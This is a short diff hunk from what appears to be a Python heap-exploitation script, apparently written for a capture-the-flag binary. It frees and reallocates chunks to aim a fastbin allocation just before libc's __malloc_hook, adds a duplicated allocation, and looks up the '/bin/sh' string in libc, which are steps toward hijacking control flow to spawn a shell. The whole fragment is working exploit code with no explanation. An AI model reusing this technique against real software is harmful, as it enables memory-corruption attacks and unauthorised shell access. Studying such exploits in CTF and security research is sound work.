@@ -66,8 +66,9 @@ add(0x18, '\xaa' * 8, '\xaa' * 0x2f) # n4
 add(0x18, '\xaa' * 8, '\xbb' * 0x30) # n5
 delete(4)
 
-malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13 # shift for 0x7f like padding
+malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13# shift for 0x7f like padding
 add(0x58, p64(malloc_hook), 'MALLOC_HOOK')
+add(0x58, '\x18', '\x87' * 48)
 add(0x58, '\x18', '\x87' * 48)
 
 binsh = libc_base + libc.search('/bin/sh').next()
